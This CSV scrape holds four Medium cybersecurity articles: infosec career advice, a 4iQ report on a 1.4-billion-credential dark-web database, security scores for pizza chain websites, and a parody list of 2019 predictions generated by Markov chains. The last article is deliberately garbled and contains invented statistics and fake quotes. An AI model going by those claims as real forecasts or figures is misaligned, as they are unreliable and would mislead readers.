Title,Link,Text,Tag
10 things to know before getting into cyber security,https://doublepulsar.com/8-things-to-know-before-getting-into-cyber-security-ab9010a4ff1c?source=tag_archive---------1-----------------------,"I’m old. Like super old. Like 36 old. So I thought it might be nice to give back some things which I’ve learnt over the years about InfoSec. Or as we call it now, CyberSec. Which sounds like a really inappropriate IRC moment, if you’re old.
I tweeted a while ago asking people what things they wish they had known before getting into cyber security. I mused on those tweets, and added my thoughts and opinions. Because what the world needs is another blog from somebody you’ve never heard of, right?
This was by far the popular thing people tweeted at me, all negative sentiment. People said they did not realise the political arena they would be entering.
So here’s the spoiler: there’s very few jobs where you will be doing security for the sake of doing security. Smart organisations want security to enable them to operate securely, which can mean getting out of the way (which can include products and deployment configs which allow people to get on with working).
Some businesses play fast and very loose with security. It’s actually really rare to see an organisation with anything near good security. For many organisations they just cannot realistically afford to run anything near top security — that crab paste company you’re eyeing a cyber job at needs to make crab paste, not have everybody logging in using triple factor SSH keys.
My view with politics is — usually — I actually enjoy it. Not always. The key for me has been learning to try to influence people gently towards a desired outcome — that might take time and patience — and to know when to get over myself and compromise on something to get a better longer term goal or standing within an organisation. A really key one is listening. Sometimes what you’re proposing really isn’t possible with the resources a department/team/company has. Sometimes what you’re proposing isn’t workable for reasons you’ve never even thought of. Sometimes what you’re proposing is just dumb in the real world. And sometimes the arguments an organisation will present against doing something won’t make sense. The key thing is you’ve listened, and you can go away and figure what to challenge, and how.
But, essentially, if you’re getting into the industry thinking most companies have great security and you’re there to enforce the best possible practices of security and there will be little politics: you may have a bad time. Most companies now recognise cyber security as a key risk; that does not mean it is a key focus of a company. And rightly so. Cyber security aren’t there to make a cyber security company, they’re there to enable a company to get back to being that company.
Cyber has exploded. Back when I was a kid it was a bunch of hanging out on IRC and visiting Vegas. The idea you would hire a hacker was laughable to most people. It was a small culture of generalists. At my first job, an oil company, whenever I talked about deploying virus software they would ask me if I meant “anti-virus” software. Yes. Because that was my job. But they were convinced it meant something bad.
Nowadays, some organisations have Risk teams, you have Policy, you have red teams trying to break into companies, you have people sat looking at Splunk trying to figure out what is happening to defend their organisations.
It’s worth keeping in mind most every conversation you have internally in departments will be with somebody who looks at something in a specific way. It’s also worth keeping in mind this with online conversations, too. Lots of conversations online go something like “Just patch!”. Which, from a policy point of view, is absolutely right. From the point of view of the people who actually do the patching at scale and manage the systems operationally, “Just patch!” is a bit like saying “Just phone up Taylor Swift and ask her to be your friend”.
This also swings the other way. I was part of a conversation recently with lots of people at lots of UK companies about how to build a great Vulnerability Management team rather than a good one. A great deal of the people had this opinion; you have a dedicated Vulnerability Management team?! Many organisations are still struggling to resource basic patching. It ties into the broadchurch thing; keep in mind what you see and what the person you’re talking to sees, although in theory you’re looking at the same thing, may look very different depending on their experiences.
Back in my youth(tm), we would hang on IRC all day, and then meet up at night for drinks. People knew each other’s real life infos when they met. Trusts were formed. Ideas were exchanged. And, well, lots of idiots were around too.
Many of those people got jobs at big companies, or left the industry.
What is left is a weird shell with lots of different angles. Some of it is brilliant. I like InfoSec Twitter, for example, most of the time as I see material I wouldn’t otherwise. I read almost no InfoSec websites; I exist off a diet of animated GIFs and info drops. I try to never take it seriously.
But there’s a weird atmosphere. I think the Infosec community has gradually eroded, and in it’s place there’s a weird dynamic of self importance emerging, especially post WannaCry as companies seek to find talent.
There’s a lot of punching and drama I try to avoid, particularly on Twitter. I tend to avoid LinkedIn as it appears to be mostly people reposting articles from the press, where I don’t think anybody involved really understands the thing they’re highlighting.
I think there’s a very real echo chamber, too.
My overall feeling is the InfoSec community is beginning to punch down. We’re punching at users, calling them thick. We’re punching a individual social media people for large companies, calling them stupid. We’re punching each other, too.
Now, you may say “Aren’t you the guy who highlighted flaws at Equifax?” Yes I am. They’re a multi-billion dollar Group of companies. I wrote about how the problems they had with Struts could be avoided. Personally I think it’s okay to highlight how large corporations can do better, without picking on people. But this is something I introspect on a lot.
I think ultimately, for me, the community now takes itself very seriously — perhaps too seriously. Twitter is a fun distraction, it can also be great info, but look at the fact I have 47,000 subscribers on Twitter and realise: that is nonsense.
Lots of people are arriving into cybersecurity. Which is great because fresh people and ideas are absolutely needed — since I started many of the same problems still exist, which is embarrassing. I think there’s a very real lack of diversity in every sense in our industry.
But here’s the thing. I think the number one quality people can bring to the arena is also experience. That doesn’t mean 10 years experience. That means existing in a job and a company and doing the hard work. If you’re really in there, delivering, doing, you’re going to be valuable and won’t have problems finding other jobs in the future. Commit. Do. Deliver.
It’s also worth pointing out many companies are still early in their cyber journey, and some need guidance. Sometimes, you may have to do things which you weren’t expecting in a role. Sometimes, that’s a bad sign. In many cases, it allows you to break free from the box you’re in and get involved in something great. Sometimes you have to gamble and take the lead. My rule is that if you’re doing something which truly aids an organisation in being secure, you’re doing it right.
This isn’t for everyone, but if you’re looking at getting into the industry, you can start a blog and write. Or learn to code and then publish said code.
You will be surprised how many basic tools in InfoSec still don’t exist. For example, through its product life there was no easy central way to report on events from Microsoft EMET. Companies are doing things like associating .vbs files to Notepad as a way of mitigating ransomware attacks, but nobody has written a tool to do this better.
Back in 1998 one of my friends got a Cobalt RaQ 3 during school work experience at Cable and Wireless INSnet. He made me the admin of the box, I reworked the Linux kernel on it to include security hardening patches (I wasn’t a usual teenager…), and we used it for hosting friends projects. I installed VMware on it, and we deployed a Virtual Machine Linux box with no outbound internet access — which we posted credentials to in IRC channels, and then used tcpdump to packet capture people owning the box. In hindsight, it was one of the early honeypots.
From Dave’s work experience, I learnt invaluable Linux admin and security techniques.
My best advice is find a niche, explore it and write about it. If it goes nowhere, either keep at it if it interests you, or find another niche. Nobody has yet nailed cyber security, so it’s a fertile land to explore. If you’re out there, people will find you for employment too.
The burn out is real. You will hit a wall. So have interests outside security.
I play video games — my Xbox Live account is 16 years old, which is older than most of the people I play against. I play games like Sea of Thieves, a game which requires voice communication and team work to sail a pirate ship. That’s actually helped me with communication skills, as — for example — there’s no on screen map, so you have to tell people which direction to sail in using compasses, and make sure people are motivated to continue otherwise they just quit.
I also play racing games — I have a full steering wheel setup, despite not having a driving license in the real world. Why? Risk and reward. I’ve crashed and burned by taking risks. I’m now better at judging when to brake.
I guess what I’m saying is other interests can help inform your work — while making sure your head isn’t in one space all the time. If you’re only looking at one thing, you will lose the bigger picture.
This debate flares up on Twitter all the time, with people (including me) saying ‘Get a job on a helpdesk’, and others saying ‘No that’s dumb, get a job straight in InfoSec’. The truth is, there is no set path here and the industry is changing so quickly that paths exist now which didn’t exist 5 years ago, and those may not exist in 5 years if there’s an industry bubble pop. Ultimately: show your worth, show you care, and always be yourself. Unless you suck.
Work on how you present things. We live in an age of information overload, so if you’re working with somebody who realistically doesn’t care about what you’re saying — for example, security isn’t their job — try to clearly communicate your thoughts. Often with as little detail as possible, unless they ask for it. And engage people. I do things like lean down at desks when talking to people so I’m below their eyeline, so appear submissive — in my first job they sent me on body language comms courses.
Ultimately, remember, you’re the security person. Your opinion matters, but so does an auditors. Help people see value in concepts and they will see value in you.
That’s right, cyber needs more humanity and people skills. Desperately. There’s way too many bearded Linux dudes like me. The precious resource which people don’t yet value is people with, well, people and business skills.
Cyber can be hilarious. Over the past two decades I’ve been situations people wouldn’t believe. During the WannaCry weekend, while Marcus was trying to fix things (and dodge press by jumping over his garden wall), I sat on conference calls I will likely never detail laughing more than I’ve ever laughed before. It was serious stuff for the UK government, it was ridiculous and fast moving and I didn’t sleep for days.
The day the Locky ransomware first appeared in 2016, I registered a DGA’d domain for it at lunchtime and streamed the failed victims to music from Taylor Swift. Wired Magazine called me for an interview about that. At the time I worked for a company which made bloater paste.
I’m just an idiot with a website, and you’ve just read this, so this industry is hilarious. Enjoy it and all the politics and amazement. Time to die.
Written by
","['All Stories', 'Contact', 'Cybersecurity', 'Jobs']"
1.4 Billion Clear Text Credentials Discovered in a Single Database,https://medium.com/4iqdelvedeep/1-4-billion-clear-text-credentials-discovered-in-a-single-database-3131d0a1ae14?source=tag_archive---------0-----------------------,"A Massive Resource for Cybercriminals Makes it Easy to Access Billions of Credentials.
Now even unsophisticated and newbie hackers can access the largest trove ever of sensitive credentials in an underground community forum. Is the cyber crime epidemic about become an exponentially worse?
While scanning the deep and dark web for stolen, leaked or lost data, 4iQ discovered a single file with a database of 1.4 billion clear text credentials — the largest aggregate database found in the dark web to date.
None of the passwords are encrypted, and what’s scary is the we’ve tested a subset of these passwords and most of the have been verified to be true.
The breach is almost two times larger than the previous largest credential exposure, the Exploit.in combo list that exposed 797 million records. This dump aggregates 252 previous breaches, including known credential lists such as Anti Public and Exploit.in, decrypted passwords of known breaches like LinkedIn as well as smaller breaches like Bitcoin and Pastebin sites.
This is not just a list. It is an aggregated, interactive database that allows for fast (one second response) searches and new breach imports. Given the fact that people reuse passwords across their email, social media, e-commerce, banking and work accounts, hackers can automate account hijacking or account takeover.
This database makes finding passwords faster and easier than ever before. As an example searching for “admin,” “administrator” and “root” returned 226,631 passwords of admin users in a few seconds.
The data is organized alphabetically, offering examples of trends in how people set passwords, reuse them and create repetitive patterns over time. The breach offers concrete insights into password trends, cementing the need for recommendations, such as the NIST Cybersecurity Framework.
While we are still processing the data, below are the technical details of our initial findings, including:
The dump includes a file called “imported.log” with 256 corpuses listed, including and with added data from all those in the Exploit.in and Anti Public dumps as well as 133 addition or new breaches. Some examples of the breaches listed the file we found:
The 41GB dump was found on 5th December 2017 in an underground community forum. The database was recently updated with the last set of data inserted on 11/29/2017. The total amount of credentials (usernames/clear text password pairs) is 1,400,553,869.
There is not indication of the author of the database and tools, although Bitcoin and Dogecoin wallets are included for donation.
The data is structured in an alphabetic directory tree fragmented in 1,981 pieces to allow fast searches.
The dump includes search tools and insert scripts explained in a README file.
We’ve found that although the majority of these breaches are known within the Breach and Hacker community, 14% of exposed username/passwords pairs had not previously been decrypted by the community and are now available in clear text.
We compared the data with the combination of two larger clear text exposures, aggregating the data from Exploit.in and Anti Public. This new breach adds 385 million new credential pairs, 318 million unique users, and 147 million passwords pertaining to those previous dumps.
Since the data is alphabetically organized, the massive problem of password reuse — — same or very similar passwords for different accounts — — appears constantly and is easily detectable.
A couple of the constant examples of password reuse that can be found:
And how password patterns changes over time:
The list of top 40 Passwords and volume found:
This experience of searching and finding passwords within this database is as scary as it is shocking. Almost all of the users we’ve checked have verified the passwords we found were true. Most reactions were
“but that’s an old password…”
commonly followed by an
“Oh my god! I still use that password in <this> site…”
a few seconds later.
4iQ’s mission is to protect your digital identity in the new data breach era by scanning the surface, social and deep and dark web.
We will be following up with more information soon and will provide solutions to protect consumers and companies from this and other alarming exposures.
Some answers to a number of requests we’ve received:
Quite a few people have asked for a link to the database, but we cannot do that. Our policy, is not to share links or details open resources that can spread such sensitive information.
As several people pointed out, including Tony:
We now have a portal (https://verify.4iq.com) where you can enter your email and receive truncated passwords sent back to that account.
We will also let you know if we did not find exposed passwords.
Please help us verify the data by hitting “reply” answering the four questions provided. Emailing us this information will help us verify and validate the data, and we can then publish statistics on these findings.
Thanks!!
Written by
","['Security', 'Cybersecurity', 'Data Breach', 'Information Security']"
2016 Cybersecurity Report (for Pizza Only) - piss.io,https://piss.io/2016-cybersecurity-report-for-pizza-only-8d8a76020b5d?source=tag_archive---------3-----------------------,"As consumers in an increasingly complex hellworld, we must entrust far more companies and individuals with our personal data than our cash-only ancestors did. If you’re like me, you probably swipe your debit or credit card several times a day without really thinking about it and log yourself into websites and services more frequently than you realize. It’s just how we operate now, for better or worse. I’m not smart or weird enough to go totally off the grid, so instead I must cope.
Over the weekend I realized that I had bought pizza twice. For the first one I entered my card online and the second time I swiped my card in-person at a point-of-sale system. In order to avoid thinking about the fact that I was having pizza twice in 2 days, I began thinking about where my personal data was actually going and decided to look into the cybersecurity of pizza.
Certainly a pizza place doesn’t have the same kind of target on its back as, well, Target. Or a bank or health insurance provider. But being a less-attractive target doesn’t mean you won’t get yours — CiCi’s Pizza experienced a massive point-of-sale data breach earlier this year, and in Maine, Portland’s local OTTO Pizza inadvertently exposed 900 customers’ information in 2014 — despite being PCI-DSS compliant.
Something often overlooked in cybersecurity reporting is that criminals don’t just target banks, governments and huge businesses — that’s Hollywood. Movies would be pretty boring if some guy was just uploading malware onto POS systems with a flash drive. The reality is, any business using and storing customer data — which is to say, basically all businesses — should be considered at-risk of being targeted. A credit card number taken from a corner pizza place is exactly as valuable as one taken from a well-prepared international retailer or what-have-you, and it’s probably significantly less risky for criminals to collect.
Web security is far more nuanced than just looking for the padlock before typing in your information. That’s a good general rule, but it’s far from the be-all-end-all. Where I work at UpGuard, we’ve built a security scoring mechanism called CSTAR. (I’m not selling anything, it’s free.) We test every website we know about on the internet continuously for a wide variety of factors and security features. Then we grade it and roll it up into a single value from 0 to 950, like a credit score. It’s all based on objective data — these scores are not our opinions. Higher scorers are better configured and probably better prepared to deal with attacks than those with low scores. (Cool fact: There are other companies doing something similar and charging thousands of dollars per site checked. We give it away for free because we like the internet.)
Now, it is true that several of the websites listed in this report have no online ordering features and aren’t much more than a static pizza menu and phone number. For them, web security may not be as directly pressing, but the state of their web server may be indicative of their overall attention to detail as a business. Most of the security features we check cost nothing and are fairly quick to implement, so if a given company’s revenue hinges on their website in any way there’s really not much of an excuse. In short, if your site is bad: c’mon, man.
I used DMOZ to find national, regional and otherwise notable pizza chains and fed their URLs (around 200) into our CSTAR web scanner. DMOZ is an open, user-edited dictionary of websites. It’s also definitely incomplete so if your favorite pizza place isn’t present, just run a CSTAR scan yourself. I’m not your dad.
This is a simple chart showing the general distribution of scores, followed by the big list. As you can see, it’s not too hot. (Unlike pizza! Get it?)
342 | 241 Pizza | 241pizza.com390 | 800 Degrees Pizza | 800degreespizza.com447 | Anthony’s Gourmet Pizza | anthonysgourmet.com304 | Anthony’s Pizza and Pasta | anthonyspizzaandpasta.com86 | Antonio’s Flying Pizza | antonios.com437 | Antonio’s Pizza by the Slice | antonioscollegestation.com475 | Apache Pizza | apache.ie114 | Apizza Scholls | apizzascholls.com390 | AppleStone Pizzeria | applestonepizzeria.com86 | Artisan Pizza | artisanpizza.ca513 | Aurelio’s Pizza | aureliospizza.com437 | Baraonda | baraondaatlanta.com390 | Barbaro | barbarosanantonio.com390 | Barry’s Pizza | barryspizza.com390 | Basil Doc’s | basildocspizzeria.com219 | Bay Ridge Pizza | bayridgepizza.com295 | The Best Neighbours Restaurant | bestneighbours.ca304 | Big Lou’s Pizza | biglouspizza-satx.com299 | BJ’s Restaurant/Brewery | bjsrestaurants.com304 | Blue Jeans Pizza | bluejeanspizza.com475 | Bollo Woodfired Pizza | bollohouston.com751 | Boston Pizza | bostonpizza.com437 | Boston’s The Gourmet Pizza | bostons.com437 | Bottoms Up Pizza | bottomsuppizza.com219 | Breadaeux Pizza | breadeauxpizza.com304 | Buck’s Pizza | buckspizza.com342 | Bufalina Pizza | bufalinapizza.com399 | Bulldawg Pizza, Wings | bulldawgpizzaandmore.com409 | Burn Pizza and Bar | burnatx.com409 | Cameli’s Gourmet Pizza Joint | camelispizza.com390 | Chicago Deep Dish Pizza | chicagodeepdishpizza.ca390 | Chicago Pizza and Oven Grinder Co. | chicagopizzaandovengrinder.com399 | Chicago’s Pizza and Pasta | chicagos-pizza.com428 | Chuck E. Cheese | chuckecheese.com475 | CiCi’s Pizza | cicis.com409 | Coal Vines | coalvinesoftexas.com741 | Connie’s Pizza | conniespizza.com523 | The Corner Grille | cornergrille.com437 | Cottage Inn Franchise | cottageinnfranchise.com342 | California Pizza Kitchen | cpk.com447 | Craig O’s Pizza Cuisine | craigositalian.com428 | Crazy Dough’s Pizza Company | crazydoughs.com561 | DePalma’s Athens | depalmasitaliancafe.com257 | Mozzarella Di Bufala Pizzeria | dibufala.com743 | Domino’s Pizza Canada | order.dominos.ca703 | Domino’s Pizza New Zealand | dominos.co.nz735 | Domino’s Pizza United Kingdom | dominos.co.uk877 | Domino’s Pizza | dominos.com829 | Domino’s Pizza Australia | dominos.com.au390 | Domino’s Pizza in San Diego County | dominossandiego.com399 | Donato’s | donatos.com228 | Doughboy’s Pizza | doughboyspizza.com342 | Dough Pizzeria Napoletana | doughpizzeria.com475 | Napoletana Pizza Ltd | enjoyfresh.net285 | Falbo Bros Pizzeria | falbobrospizza.com511 | Figaro’s Pizza | figaros.com295 | Firecrust Neapolitan Pizzeria | FIRECRUSTPIZZERIA.COM266 | Firewood Cafe | firewoodcafe.com352 | Fox’s Pizza Den | foxspizza.com277 | Little Caesars Pizza | franchise.littlecaesars.com608 | Giordano’s Pizza | giordanos.com428 | Goat Hill Pizza | goathill.com418 | Godfather’s Pizza | godfathers.com390 | Goodfella’s Old World Brick Oven Pizza | goodfellas.com238 | Mr. G’s Pizzeria | gotomrgs.com523 | Green Mill Restaurants | greenmill.com475 | Grimaldi’s Pizzeria | grimaldis.com238 | Grotto Pizza | grottopizza.com124 | Gumby’s Pizza Aggieland | gumbyspizzaaggieland.com437 | Hammy’s Pizza | hammyspizza.com181 | Happy Joe’s Pizza | happyjoes.com390 | Happy’s Pizza | happyspizza.com342 | Home Run Inn Pizza | homeruninnpizza.com409 | Home Slice Pizza | homeslicepizza.com627 | Hometown Pizza | hometownpizza.ca266 | Hot Lips Pizza | hotlipspizza.com257 | House of Pizza | houseofpizza.ca475 | Hungry Howie’s Pizza | hungryhowies.com266 | Hunt Brothers Pizza, LLC. | huntbrotherspizza.com437 | Imo’s Pizza | imospizza.com208 | Jet’s Pizza | jetspizza.com513 | Killer Pizza from Mars | killerpizzafrommars.com428 | KonoPizza | konopizza.com475 | La Dolce Vita | ladolcevitaathens.com390 | Lamppost Pizza | lamppostpizza.com656 | La Rosa’s | larosas.com475 | Ledo Pizza | ledopizza.com475 | Lefty’s Chicago Pizzeria | leftyspizza.com475 | Lisa’s Fine Foods | lisasfinefoods.net413 | Little Caesars Pizza | littlecaesars.com713 | Lou Malnati’s Pizzerias | loumalnatis.com390 | Ludica Pizzeria | ludica.ca390 | Mad Pizza | madpizza.com361 | Mamma Ilardo’s Pizzeria | mammailardos.com428 | Mangia Pizza | mangiapizza.com416 | Marco’s Pizza | marcos.com162 | Mazzio’s Pizza | mazzios.com390 | Mellow Mushroom | mellowmushroom.com475 | Metro Pizza | metropizza.com247 | Milano Pizza | milanoseattle.com333 | The Mississippi Pizza Pub | mississippipizza.com475 | Moki’s Pizza | mokispizza.com323 | Monical’s Pizza | monicals.com399 | Moretti’s Ristorante and Pizzeria | morettischicago.com390 | Mountain Mike’s Pizza | mountainmikes.com390 | Mount Athos Pizza | mountathospizza.com342 | Chris Pizza House | mychrispizza.com437 | Napoli Pizza | napoli-pizza.ca428 | Nat’s New York Pizzeria | natspizza.com304 | Nick-N-Willy’s World Famous Take-N-Bake Pizza | nicknwillys.com219 | North Beach Pizza | northbeachpizza.com390 | Northlake Tavern and Pizza House | northlaketavern.com181 | Northside Nathan’s | northsidenathanslv.com390 | Novo Pizzeria | novopizzeria.com475 | Numero Uno Pizza | numerounopizzas.com513 | Oggi’s Pizza | oggis.com437 | Old Chicago Pasta and Pizza | oldchicago.com342 | Old Town Pizza | oldtownpizza.com513 | Olympia Pizza | olympiapizza3.com390 | Olympic Pizza | olympicpizzahydepark.com361 | Pasquini’s Pizzeria | originalpasquinis.com437 | Pantaleone’s New York Pizza | pantaleones.net428 | Papa Gino’s | papaginos.com430 | Papa John’s Pizza | papajohns.com689 | Papa Murphy’s International | papamurphys.com390 | Papa Ray’s Pizza | paparayspizza.com513 | Papa’s Pizza Place | papaspizzaplace.com219 | Papa’s Pizza To-Go, Inc. | papaspizzatogo.com475 | Paula | paulaandmonicaspizzeria.com323 | Paul Revere’s Pizza International, Ltd. | paulreverespizza.com409 | Peter Piper Pizza | peterpiperpizza.com304 | Pie-Eyed Pizzeria | pie-eyedpizzeria.com409 | Piece Brewery and Pizzeria | piecechicago.com171 | Piecora’s Pizza | piecoras.com447 | Pier 49 Pizza | pier49.com190 | Pizano’s Pizza and Pasta | pizanoschicago.com703 | Domino’s Pizza Belgium | dominos.be447 | Pizza Bob’s Classic Pie | pizzabobs.ca475 | Pizza Delight | pizzadelight.com513 | Pizza Guys | pizzaguys.ca190 | Pizza House | pizzahouse.com703 | Pizza Hut Canada | pizzahut.ca618 | Pizza Hut New Zealand | pizzahut.co.nz877 | Pizza Hut | pizzahut.com789 | Pizza Hut Australia | pizzahut.com.au257 | Pizza Hut Malaysia | pizzahut.com.my618 | Pizza Hut Sri Lanka | pizzahut.lk513 | Pizza Hut Middle East | pizzahut.me475 | Pizza Hut Franchise | pizzahutfranchise.com428 | Pizza Inn | pizzainn.com428 | Pizza Joe’s | pizzajoes.com333 | Pizza Pit | pizzapit.com390 | The Pizza Ranch | pizzaranch.com238 | Pizza Shuttle | pizzashuttle.com295 | Pizzeria Luigi | pizzerialuigi.com295 | Pizzicato | pizzicatopizza.com428 | Plateau Pizza | plateaupizza.com171 | Pop Up Pizza | popuppizzalv.com475 | Port A Pizzeria | portapizzeria.com390 | Slice of Chicago Pizza | portaransaspizza.com390 | Positano’s Pizza | positanospizza.com428 | Puccini’s Smiling Teeth | puccinissmilingteeth.com333 | Razzis Pizzeria | razzispizza.com390 | RedBrick Pizza | redbrickpizza.com390 | Rocky Rococo | rockyrococo.com266 | Romano’s Pizza | romanospizza.ca437 | Rosati’s Pizza | rosatispizza.com435 | Round Table Pizza | roundtablepizza.com361 | Sammy’s Worlds Greatest Pizza | sammysworldsgreatestpizza.com304 | Savage Pizza | savagepizza.com447 | Pizza Schmizza | schmizza.com437 | Slice | sliceatlanta.com342 | Snappy Tomato Pizza | snappytomato.com437 | Sophies Pizza | sophiespizza.ca228 | Sopranos Pizza and Pasta | sopranos-pizza.com352 | Star Pizza | starpizza.net371 | Stella Pizza | stellarpizza.com342 | St Elmo’s | stelmos.co.za494 | T. Anthony Pizzeria and Restaurant | tanthonypizzeria.com447 | The Backspace | thebackspace-austin.com437 | The Firewood Cafe | thefirewoodcafe.ca352 | The Parlour | theparlourrestaurants.com266 | Tortoricie’s Pizzeria | tortoricespizza.com276 | Trilussa Pizza and Pane | trilussa.ca390 | Trio’s Pizza | triospizza.com380 | Tutta Bella | tuttabella.com380 | Uno Chicago Grill | unos.com418 | Valentino’s Pizza | valentinos.com437 | Via Tevere Pizzeria | viateverepizzeria.com181 | Via Tribunali | viatribunali.com475 | Waldo Cooney’s Pizza | waldocooneyspizza.com209 | Willy’s Pizza | willyspizza.ca257 | Woodstock’s Pizza | woodstockssd.com456 | Without Papers Pizza | wopizza.ca323 | Your Pie | yourpie.com437 | Zayda Buddy’s | zaydabuddyspizza.com475 | Zeeks Pizza | zeekspizza.com
Run one-off scans at https://app.upguard.com/webscan or if you need a list of companies’ CSTAR scores, email me.
Take a look at the detailed scan results at https://app.upguard.com/webscan and look at test failures, then fix them. Again, I am not your dad.
Written by
","['Pizza', 'Cybersecurity', 'Website']"
2019 Cyber Security Predictions - Kelly Shortridge - Medium,https://medium.com/@kshortridge/2019-cyber-security-predictions-6000e49b9803?source=tag_archive---------7-----------------------,"Fed up with ridiculous infosec predictions for the upcoming year, I decided to aggregate them all and use the power of Markov Chains to generate my own list. What follows is the result, very lightly edited solely for readability. You can see last year’s edition here.
In 2019, we predict 2019. Cyber espionage, cybercriminals — in 2019, they materialize. What if this is a dangerous reality? For example, consider how the world feels sometimes. According to Ponemon, security leaders around the world feel sometimes.
During 2019 we expect to see an increase in cyber space. The prospects are understatement. If a sophisticated attack involves not one but five top-notch threats synergistically working together, the defense panorama could become very blurry. Security experts have a recipe for disaster.
We predict that criminals will further focus their efforts injudiciously, ignoring the lower severity vulnerabilities with known exploits in favor of largely academic high severity vulnerabilities. In 2019, we will see a version of this fictional attacker.
The purchase of cybersecurity has led to expanding attacks that will become more sophisticated in 2019 and beyond. We will continue to influence societal expectations on security, which will trickle down to companies through hundreds of thousands of vulnerable and easy targets for attackers to profit. Driven by many falling victim to feature misconceptions, more will become key targets. Cyber products that provide consolidated feature sets have a hard time understanding each customer’s specific pain points and the bad guys know this.
In 2019, even more high-profile breaches will push the security and privacy, finally. Security is argued about until we die. That’s a particularly terrifying threat.
In this day and age of big data, artificial intelligence is the next weapon. The gold standard in hacking efficiency, weaponized AI offers attackers unparalleled insight into what, when, and where to strike. Attempts to weaponize AI offers attackers actual attacks. Systems could launch coordinated cyber criminals to increasingly AI. Is it a matter of anomalies.
AI could be exploited and could also leverage machine-learning and artificial intelligence and machine-learning technologies. The consistent threat is very real. In 2017, a Vietnamese security group claims to have created a mask that can learn incrementally from data scientists providing frequent feedback.
We predict AI-powered attacks become the keys for email scams. For example, imagine a fake AI-created phishing using AI to aid assaults. Unlike humans, machines can do it in seconds and continue even after business hours. They have gotten smarter about phishing and other human activities such as opening doors. Closer to home, AI will expose the mistakes they’ve made regarding human activities.
Automated systems powered by AI could also be used to evade detection by infrequently trained machine learning engines. This game of cat and machine-learning technology will be an investment in the new year. There will likely be future attacks focused on building robust centers for security breach infringement, but the AI bubble has many experts worried.
In 2019, we will see brute force attacks powered by AI. The attack requires automating out all the less interesting stuff so attackers can focus their resources on such attractive, data-rich environments, with no downtime to these utilities. More corporate attacks based on math will propel this trend forward.
Skynet is becoming broader and more expansive. To combat this, organizations have turned to the promise of big data, artificial intelligence (AI), and machine learning. Automated systems powered by AI could help people better understand the tradeoffs involved when they give up personal information in their malicious software.
The fragility of some AI technologies will become the picklock that opens a much larger door. Certain algorithms may be too late. 2019 will demonstrate a lot of the “AI Winter” of 1969, in which Congress cut funding as results lagged behind lofty expectations. AI will bolster security in 2019 to a total of $206.2 billion, up from $175.8 billion in 2016, down to $14 billion by 2025.
The buzz for cybersecurity AI is expected to grow in popularity. As the report notes, the pure-play AI security story also has a dark side — they will start scamming you. In addition, certain algorithms may be too complex to understand what is driving a specific set of security firm activities that are popping up in Cyber Town, USA.
AI start-ups are going to exploit the growth of attacks. Analytics solutions will extort companies with 1,000 or more slippery endpoints. Based on developments we are seeing, this change will come as all teams recognize that cybersecurity AI in the purest sense is nonexistent, and we will continue raging.
Cloud adoption will begin to expand the world (though many dispute this story). By default, cloud is sensitive data. Also, the internet. In 2019, attackers will hold the internet hostage on a computer disc with Internet written on tape in sharpie.
Cloud adoption is game-changing in the threat equation. Many of the tried and true attacks of five years ago don’t work very well in the cloud. Organizations are rapidly shifting content to the cloud, therefore we predict a shortfall of 3.5 million cyber threats that demonstrates a real demand for these easy pickings.
Organizations will struggle to manipulate public cloud and will experience a massive security priority for 2019. Emerging technologies used to protect the cloud not only help capture the big picture but also are less effective at mitigating. Cloud and DevOps teams’ security experts are worried.
Cyber criminals will use big-scale platforms to create instead of just one, five top-notch threats in today’s landscape. Such threats would be very difficult for hackers. Attacks are usually centered on the use of one threat. Bad actors concentrate their efforts on iterating and evolving one threat at a time for effectiveness and evasion.
With an attack surface of automated prevention methods, like embedded human microchips, for example, attackers will generate new threats such as AWS and Azure. Large-scale data breaches will be attributed to misconfigured Amazon S3 buckets. This is clearly not the fault of AWS. IDG, for example, calls 2019 “a seminal year” on the criminal to-do list, since criminals can silently steal thousands of open buckets and credentials.
Still, I make a brilliant, contrarian, and very accurate prediction: You might lose the data. There will be surprises, too, says Captain Obvious.
The security breaches will be IoT. There is an ever-increasing probability that these devices make their vulnerabilities. The Future often uses an IoT botnet, which runs the entire network. In one example, an attacker could compromise or alter a chip or add source code to avoid or delay botnet takedowns.
Another challenge is the newest form of an attack that combines card enumeration with smart gadgets, from plugs to TVs, coffee makers. In transportation, data has been accused of sneaking into a site connected to traffic lights. With IoT growth posing huge unknown risks to enterprises with the internet, which runs entirely in memory without effective mitigation, this tactic works. Refrigerators and washing malware will be undetected.
“I think the big innovation is in best practice standards for IoT” — Damon Ponemon, Vice President of Technology to Detect Evil.
This year we highlighted privacy, finally, due to the European Union’s mid-2018 implementation of the internet. Nearly every nation has not been able to settle on a standard of constant privacy, which will continue to exacerbate in 2019. Singapore and India are consulting to adopt breach notification regimes, while Australia has already enforced GDPR-like legislation due to lack of attribution and accountability.
The Data Protection legislative and regulatory environment will become the de facto method for spreading malicious scripts directly on targeted subjects and organizations. The U.S. government will give birth to more advanced technology and employee training in order to distribute it quickly and surreptitiously to malware. Congress is already working on an RDP option.
“Managing privacy will become a huge priority for the C-suite and board” — Prasad Woodridge, More Compliance Officer
In 2019, black hat hackers will penetrate critical aspects of GDPR to become broadly deployed threats. The internet itself is ripe for the taking by someone with PCI or SOX. Well-crafted emails designed to avoid detection are likely to be life-threatening; however, we’re unlikely to see upticks in legislative and regulatory activity. With this in mind, even an organization that erased event logs and backups to avoid investigation will have to decide whether something that happened was supposed to happen.
In 2019, we predict malware. Attackers will undoubtedly continue to evolve their tactics to steal credit cards and credentials. Malware authors will turn to either more targeted attacks using embedded chips on printers or use ransom techniques, including the manipulation of memory space and adding arbitrary code. Because the attack landscape continues to evade AI-based solutions, attackers will be able to use this naivete to their advantage and pull off a major attack with ransomware.
There is a race to get the most troubling widespread ransomware-as-a-service. These attacks often have costs far beyond the ransom itself. There is evidence that the author of GandCrab is already working on their marketing campaign to extort companies by threatening the data lakes. What can we do? What is permissible? What if we are missing the reasons synergic threats are becoming more than just real people? We will continue to falter.
In 2019, we’ll see the emergence of new threats such as cryptocurrency and the overwhelming demand for the large amounts of computing. Inevitably, there will be a battle as to which is more convenient than ransomware. An example is WaterMiner, which simply stops its mining process when the consumer is just about die.
In 2019, cyber activities collide with physical worlds. New techniques will use attacks on critical infrastructure of blockchain, with a touch of “Huh?”
In 2019, the next vector in attacks will continue — privileged accounts, because bots. Identity is a fundamental shift in risk. Identity providers are exposed to an increase in the Open Authorization standard. Access management solutions are actually the intended malware — one was launched by Fancy Bear, the Russian cyber espionage.
“Edge device” breaches will push the security industry to finally solve the username/password problem. The ineffective username/password conundrum has plagued consumers and businesses for years. AI could be used in the hope that 2019 will see a more concerted effort to replace passwords altogether.
